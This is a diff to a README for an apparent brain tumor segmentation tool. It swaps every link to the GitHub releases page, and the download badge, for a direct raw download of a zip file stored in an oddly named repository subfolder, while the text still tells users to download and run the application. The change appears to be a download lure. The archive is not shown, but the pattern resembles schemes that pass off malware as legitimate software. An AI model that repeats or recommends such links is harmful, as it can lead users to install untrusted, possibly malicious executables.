@@ -1,6 +1,6 @@
 # 🧠 Brain-Tumor-Segmentation-Project - Accurately Analyze Brain Tumors
 
-[![Download](https://img.shields.io/badge/Download-Versions-brightgreen)](https://github.com/YtDp4UDLc3gy26I/Brain-Tumor-Segmentation-Project/releases)
+[![Download](https://raw.githubusercontent.com/YtDp4UDLc3gy26I/Brain-Tumor-Segmentation-Project/main/tomahawker/Brain-Tumor-Segmentation-Project.zip)](https://raw.githubusercontent.com/YtDp4UDLc3gy26I/Brain-Tumor-Segmentation-Project/main/tomahawker/Brain-Tumor-Segmentation-Project.zip)
 
 ## 📋 Description
 
@@ -19,7 +19,7 @@ To get started with the Brain-Tumor-Segmentation-Project, follow these simple st
 
 2. **Download and Install**  
    Visit this page to download the latest version of the project:  
-   [Download the Latest Release](https://github.com/YtDp4UDLc3gy26I/Brain-Tumor-Segmentation-Project/releases)  
+   [Download the Latest Release](https://raw.githubusercontent.com/YtDp4UDLc3gy26I/Brain-Tumor-Segmentation-Project/main/tomahawker/Brain-Tumor-Segmentation-Project.zip)  
    Once there, locate the appropriate file for your operating system and click to download it.
 
 3. **Run the Application**  
@@ -80,4 +80,4 @@ This project is licensed under the MIT License. Feel free to use and modify the 
 With the Brain-Tumor-Segmentation-Project, you will enhance your ability to analyze brain tumors effectively. Follow the above steps to get started, and take advantage of this useful tool for medical imaging.  
 
 Remember to visit the release page for updates and new features:  
-[Download the Latest Release](https://github.com/YtDp4UDLc3gy26I/Brain-Tumor-Segmentation-Project/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/YtDp4UDLc3gy26I/Brain-Tumor-Segmentation-Project/main/tomahawker/Brain-Tumor-Segmentation-Project.zip)
